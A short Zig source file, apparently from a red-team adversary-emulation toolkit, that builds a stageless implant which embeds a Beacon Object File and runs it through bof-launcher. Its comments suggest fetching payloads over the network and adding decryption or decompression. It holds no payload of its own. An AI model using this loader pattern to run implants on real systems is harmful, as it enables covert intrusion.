const std = @import("std");
const assert = std.debug.assert;
const bof = @import("bof_launcher_api");

const bof_raw = @embedFile("z_beacon_embed");

pub fn main() noreturn {

    //
    // 1. By defualt this is a stageless implant, it could be easily turned to staged one though.
    //    Instead of embedding a BOF within the executable just provide routines to
    //    fetch it over a network using a protocol of chocie.
    //

    //
    // 2. BOF preprocessing like decoding/decryption and/or decompression could be done here
    //    to better serve your mission requirements (i.e. the adversary you're simulating)
    //

    //
    // 3. Run our BOF using bof-launcher's "one-shot" BOF load & execute routine
    //    (BOF Object and BOF context creation is done inside this function)
    //
    _ = bof.run(bof_raw[0..bof_raw.len]) catch unreachable;

    unreachable;
}
